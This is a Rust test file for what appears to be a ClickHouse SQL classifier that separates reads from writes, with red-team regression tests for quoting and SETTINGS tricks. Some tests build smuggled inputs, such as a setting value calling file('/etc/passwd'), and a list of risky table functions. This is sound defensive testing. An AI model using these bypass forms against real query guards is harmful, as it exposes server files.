        .active(
            "after WITH FILL",
            "SELECT * FROM t ORDER BY a WITH FILL STEP 1 ",
            " t",
        )
        .active("after QUALIFY", "SELECT * FROM t QUALIFY ", " t")
        .active(
            "after an ASOF JOIN's ON",
            "SELECT * FROM t ASOF JOIN u ON t.a = u.a AND ",
            " t",
        )
        .active(
            "after GLOBAL IN",
            "SELECT * FROM t WHERE a GLOBAL IN ",
            " t",
        )
        .active("in a lambda", "SELECT arrayMap(x -> ", ", arr) FROM t")
        .active(
            "in a parametric aggregate's arguments",
            "SELECT quantile(0.5)(",
            ") FROM t",
        )
        .active("in an array literal", "SELECT [1, ", "] FROM t")
        .active("in a map literal", "SELECT {'a': ", "} FROM t")
        .active("after a typed parameter", "SELECT {p1:String} ", " t")
        .active(
            "after a parameter of a quoted type",
            "SELECT {p1:Enum8('a' = 1)} ",
            " t",
        )
        .active("after a :: cast", "SELECT a::UInt64 ", " t")
        .active("after a tuple element", "SELECT (1, 2).1 ", " t")
        .active("after an EXCEPT column list", "SELECT * EXCEPT (a) ", " t")
        .active(
            "after SETTINGS",
            "SELECT * FROM t SETTINGS max_threads = 1 ",
            " t",
        )
        // A setting's name, also after one whose value is a string or a map (red team, round
        // 3).
        .active(
            "as a setting's name",
            "SELECT * FROM t SETTINGS max_threads = 1, ",
            " = 1",
        )
        .active(
            "as a setting's name after a string value",
            "SELECT * FROM t SETTINGS log_comment = 'x', ",
            " = 'a > 0'",
        )
        .active(
            "as a setting's name after a map value",
            "SELECT * FROM t SETTINGS http_response_headers = {'a': 'b'}, ",
            " = 'a > 0'",
        )
        .active(
            "as a setting's name in a subquery",
            "SELECT * FROM (SELECT * FROM t SETTINGS ",
            " = 'a > 0') AS s",
        )
        .active(
            "as a setting's name of EXPLAIN",
            "EXPLAIN SELECT 1 SETTINGS ",
            " = 'a > 0'",
        )
        .active("after FORMAT", "SELECT * FROM t FORMAT JSON ", " t")
        .active("after FROM t in a FROM-first query", "FROM t ", " t")
        .active("after a pipe operator", "FROM t |> WHERE ", " t")
        .active("after a pipe SELECT", "FROM t |> SELECT ", " t")
        .active("after a heredoc", "SELECT $h$ a $h$ ", " t")
        .active("after a string with ''", "SELECT 'it''s' ", " t")
        .active("after a string ending in \\\\", "SELECT 'a\\\\' ", " t")
        .active(
            "after a backquoted name holding \\`",
            "SELECT `a\\`b` ",
            " t",
        )
        .active(
            "after a double-quoted name holding \\\"",
            "SELECT \"a\\\"b\" ",
            " t",
        )
        .active(
            "after EXPLAIN ANALYZE and SELECT",
            "EXPLAIN ANALYZE SELECT 1 ",
            " t",
        )
        .active("after SHOW and ;", "SHOW TABLES; ", " t")
        .active("after SHOW TABLES", "SHOW TABLES ", " t")
        .active("after DESCRIBE TABLE t", "DESCRIBE TABLE t ", " t")
        .active("after EXISTS t", "EXISTS t ", " t")
        .active(
            "after EXPLAIN AST and SELECT",
            "EXPLAIN AST SELECT 1 ",
            " t",
        )
        .active(
            "after EXPLAIN CURRENT TRANSACTION",
            "EXPLAIN CURRENT TRANSACTION ",
            " t",
        )
        .active("after DESCRIBE and ;", "DESCRIBE TABLE t; ", " t")
        .active("after EXISTS and ;", "EXISTS TABLE t; ", " t")
        .active("after a # comment line", "SELECT 1 #! c\n", " t")
        // What a Unicode-quoted string or name holds opens nothing (red team, round 2).
        .active("after a ‘string’ holding '", "SELECT ‘'’ ", " t --'")
        .active("after a “name” holding '", "SELECT “'” ", " t --'")
        .active("after a “name” holding `", "SELECT “`” ", " t --`")
        .active("after a ‘string’ holding \"", "SELECT ‘\"’ ", " t --\"")
        .active("after a ‘string’ holding --", "SELECT ‘--’ ", " t")
        .active("after a ‘string’ holding #", "SELECT ‘# ’ ", " t")
        .active("after a “name” holding //", "SELECT “//” ", " t")
        .active("after a ‘string’ holding /*", "SELECT ‘/*’ ", " t -- */")
        .active("after a “name” holding $h$", "SELECT “$h$” ", " t -- $h$")
        .active("after a “quoted” qualifier", "SELECT “s”.", " FROM t")
        .inert("in a heredoc", "SELECT $h$ ", " t $h$ FROM x")
        .inert(
            "in a heredoc holding a quote",
            "SELECT $h$ ' ",
            " t $h$ FROM x",
        )
        .inert(
            "in a heredoc holding another tag",
            "SELECT $a$ $b$ ",
            " $b$ $a$ FROM x",
        )
        .inert("in a string past ''", "SELECT 'a'' ", " t' FROM x")
        .inert("in a string past \\'", "SELECT 'a\\' ", " t' FROM x")
        // Not inert past `\`` or `\"` in a name: the reading without escapes ends it there.
        .inert("in a ‘string’ holding '", "SELECT ‘' ", " t’ FROM x")
        .inert("in a “name” holding '", "SELECT “' ", " t” FROM x")
        .inert(
            "in a ‘string’ holding \" and `",
            "SELECT ‘\" ` ",
            " t’ FROM x",
        )
        .inert(
            "in a “name” holding -- and #",
            "SELECT “-- # ",
            " t” FROM x",
        )
        .inert("in a ‘string’ holding /*", "SELECT ‘/* ", " t’ FROM x")
        .inert("in a “name” holding $h$", "SELECT “$h$ ", " t $h$” FROM x")
        .inert("in a ‘string’ holding \\", "SELECT ‘\\ ", " t’ FROM x")
        .inert(
            "in a backquoted name holding a quote",
            "SELECT `a'b ",
            " t` FROM x",
        )
        .inert(
            "in a parameter type's string",
            "SELECT {p1:Enum8('",
            " t' = 1)} FROM x",
        )
        .inert("in a map literal's key", "SELECT {'", " t': 1} FROM x")
        .inert("in a #! comment", "SELECT 1 #! ", " t\nFROM x")
        .inert("in a // comment", "SELECT 1 // ", " t\nFROM x")
        .inert("in a string holding //", "SELECT '// ", " t' FROM x")
        .vocab(&[
            "FINAL",
            "SAMPLE",
            "PREWHERE",
            "ARRAY",
            "GLOBAL",
            "ANY",
            "ASOF",
            "SETTINGS",
            "FORMAT",
            "JSONEachRow",
            "OUTFILE",
            "TOTALS",
            "FILL",
            "QUALIFY",
            "PARALLEL",
            "EXCEPT",
            "INTERVAL",
            "->",
            "::",
            "|>",
            "{p1:String}",
            "{p2:Enum8('a' = 1)}",
            "{'a': 1}",
            "[1, 2]",
            "(1, 2).1",
            "$h$ a $h$",
            "$h$",
            "#! c\n",
            "// c\n",
            "'a\\'b'",
            "`a\\`b`",
            "\"a\\\"b\"",
            "‘a’",
            "“a”",
            "‘'’",
            "“--”",
            "“\\”",
            "“url”(",
            "dictGet(",
            "arrayMap(",
            "quantile(0.5)(",
            "numbers(",
            "url(",
            "file(",
            "remote(",
            "s3(",
            "aiGenerate(",
            "icebergBucket(",
        ])
}

#[test]
fn generated_cases() {
    suite().check();
}

#[test]
fn fuzz() {
    suite().fuzz(3000);
}

/// The settings whose values are SQL the server runs are words of `writes`, and so is the
/// SETTINGS clause, since `select`, `order` and `filter` are keywords (red team, round 3): a
/// value calling a write call is a write in every place a SETTINGS clause goes, through every
/// quote form of the setting's name.
#[test]
fn settings_that_take_sql_are_writes() {
    use crate::sqlgen::classify::StatementClass::Write;
    use crate::sqlgen::dialect::clickhouse::{LEX, RULES};
    use crate::sqlgen::dialect::lex::listed;

    for name in [
        "SETTINGS",
        "ADDITIONAL_RESULT_FILTER",
        "ADDITIONAL_TABLE_FILTERS",
        "PARALLEL_REPLICAS_CUSTOM_KEY",
        "IMPLICIT_TABLE_AT_TOP_LEVEL",
        "FORMAT_SCHEMA_SOURCE",
        "FORMAT_SCHEMA",
        "OUTPUT_FORMAT_SCHEMA",
        "FORMAT_TEMPLATE_RESULTSET",
        "FORMAT_TEMPLATE_ROW",
        "INPUT_FORMAT_RECORD_ERRORS_FILE_PATH",
        "URL_BASE",
        "S3_BASE",
    ] {
        assert!(listed(RULES.writes, name), "{name}");
    }
    let places = [
        ("SELECT * FROM t SETTINGS ", ""),
        ("SELECT * FROM t SETTINGS max_threads = 1, ", ""),
        ("SELECT 1 FORMAT JSON SETTINGS ", ""),
        ("SELECT * FROM (SELECT * FROM t SETTINGS ", ") AS s"),
        ("SELECT * FROM t WHERE a IN (SELECT a FROM u SETTINGS ", ")"),
        ("FROM t SELECT * SETTINGS ", ""),
        ("EXPLAIN SELECT 1 SETTINGS ", ""),
        ("SHOW TABLES SETTINGS ", ""),
        ("DESCRIBE TABLE t SETTINGS ", ""),
        ("EXISTS t SETTINGS ", ""),
    ];
    let names = [
        "select",
        "order",
        "filter",
        "additional_result_filter",
        "parallel_replicas_custom_key",
        "implicit_table_at_top_level",
    ];
    for (before, after) in places {
        for name in names {
            let mut forms = vec![name.to_string(), name.to_uppercase()];
            forms.extend(
                LEX.ident_quotes
                    .iter()
                    .map(|&(o, c)| format!("{o}{name}{c}")),
            );
            for form in forms {
                let sql = format!("{before}{form} = 'file(''/etc/passwd'')'{after}");
                assert_eq!((SPEC.classify)(&sql), Write, "{sql}");
            }
        }
    }
}

/// Every write call through every quote form of names, bare, qualified, where a table goes and
/// where none does (red team, round 2: through Unicode quotes they read).
#[test]
fn quoted_callees_in_every_position() {
    use crate::sqlgen::classify::StatementClass::Write;
    use crate::sqlgen::dialect::clickhouse::{LEX, RULES};

    let positions = [
        ("SELECT ", "('x')"),
        ("SELECT db.", "('x')"),
        ("SELECT * FROM ", "('x')"),
        ("SELECT * FROM db.", "('x')"),
        ("SELECT * FROM t, ", "('x')"),
        ("SELECT * FROM t JOIN ", "('x') AS u ON t.a = u.a"),
        ("SELECT * FROM t WHERE 1 IN ", "('x')"),
        ("SELECT * FROM t WHERE 1 GLOBAL IN ", "('x')"),
        ("FROM ", "('x') |> WHERE 1"),
        ("DESCRIBE TABLE ", "('x')"),
        ("EXPLAIN TABLE OVERRIDE ", "('x') PARTITION BY a"),
    ];
    for t in super::write_tokens(&RULES).iter().filter(|t| t.call) {
        for name in [t.name.clone(), t.name.to_lowercase()] {
            for &(open, close) in LEX.ident_quotes {
                for (before, after) in positions {
                    let sql = format!("{before}{open}{name}{close}{after}");
                    assert_eq!((SPEC.classify)(&sql), Write, "{sql}");
                }
            }
        }
    }
}
